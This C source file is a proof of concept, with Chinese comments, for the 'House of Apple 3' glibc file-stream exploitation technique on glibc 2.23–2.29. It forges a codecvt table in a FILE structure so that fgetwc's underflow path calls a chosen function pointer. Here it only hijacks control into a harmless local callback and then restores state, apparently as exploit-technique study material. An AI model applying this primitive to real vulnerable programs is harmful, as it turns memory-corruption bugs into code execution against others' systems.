#define _GNU_SOURCE
/*
 * House of Apple 3 早期 codecvt 最终触发点：glibc 2.23～2.29，x86-64。
 *
 * 这一段的 `_IO_codecvt` 仍保留兼容 libstdc++ codecvt 的 8 个直接函数
 * 指针。`_IO_wfile_underflow` 会直接调用：
 *
 *   fp->_codecvt->__codecvt_do_in(codecvt, state, from..., to...)
 *
 * 其中 `__codecvt_do_in` 位于 fake codecvt+0x18。glibc 2.30 的提交
 * 09e1b0e 删除这组直接指针，改走 `__gconv_step.__fct`，所以 2.30 与
 * 2.31+ 分别使用本目录另外两份 C PoC。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

static int callback_count;
static void *expected_codecvt;

static int apple3_do_in(void *codecvt, void *state,
                        const char *from_start, const char *from_end,
                        const char **from_stop,
                        wchar_t *to_start, wchar_t *to_end,
                        wchar_t **to_stop)
{
    (void)state;
    callback_count++;
    assert(codecvt == expected_codecvt);
    assert(from_start < from_end);
    assert(to_start < to_end);

    *to_start = L'3';
    *to_stop = to_start + 1;
    *from_stop = from_end;
    return 0; /* 返回旧 ABI 的成功状态 __codecvt_ok。 */
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    FILE *fp = tmpfile();
    assert(fp != NULL);
    assert(fwide(fp, 1) > 0);

    void **codecvt_slot = (void **)((char *)fp + 0x98);
    void *saved_codecvt = *codecvt_slot;
    void *wide_data = *(void **)((char *)fp + 0xa0);
    assert(saved_codecvt != NULL && wide_data != NULL);

    int saved_flags = fp->_flags;
    char *saved_read_ptr = fp->_IO_read_ptr;
    char *saved_read_end = fp->_IO_read_end;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr;
    char *saved_write_end = fp->_IO_write_end;
    unsigned char saved_wide_prefix[0x80];
    memcpy(saved_wide_prefix, wide_data, sizeof(saved_wide_prefix));

    uint64_t fake_codecvt[0x100 / 8] __attribute__((aligned(0x10)));
    wchar_t wide_output[8];
    char external_input = 'A';
    memset(fake_codecvt, 0, sizeof(fake_codecvt));
    memset(wide_output, 0, sizeof(wide_output));

    /* 早期 `_IO_codecvt`：destr +0x0、do_out +0x8、do_unshift +0x10、
       do_in +0x18。underflow 只消费这里设置的 do_in。 */
    fake_codecvt[0x18 / 8] = (uintptr_t)apple3_do_in;
    expected_codecvt = fake_codecvt;
    *codecvt_slot = fake_codecvt;

    uintptr_t *wide = (uintptr_t *)wide_data;
    wide[0x00 / 8] = (uintptr_t)wide_output;
    wide[0x08 / 8] = (uintptr_t)wide_output;
    wide[0x10 / 8] = (uintptr_t)wide_output;
    wide[0x30 / 8] = (uintptr_t)wide_output;
    wide[0x38 / 8] = (uintptr_t)(wide_output + 8);
    fp->_IO_read_base = &external_input;
    fp->_IO_read_ptr = &external_input;
    fp->_IO_read_end = &external_input + 1;
    fp->_flags &= ~(0x10 | 0x4);

    wint_t result = fgetwc(fp);
    assert(result == L'3');
    assert(callback_count == 1);

    *codecvt_slot = saved_codecvt;
    fp->_flags = saved_flags;
    fp->_IO_read_ptr = saved_read_ptr;
    fp->_IO_read_end = saved_read_end;
    fp->_IO_read_base = saved_read_base;
    fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr;
    fp->_IO_write_end = saved_write_end;
    memcpy(wide_data, saved_wide_prefix, sizeof(saved_wide_prefix));
    fclose(fp);

    puts("[+] Apple3：旧 codecvt 回调命中");
    return 0;
}
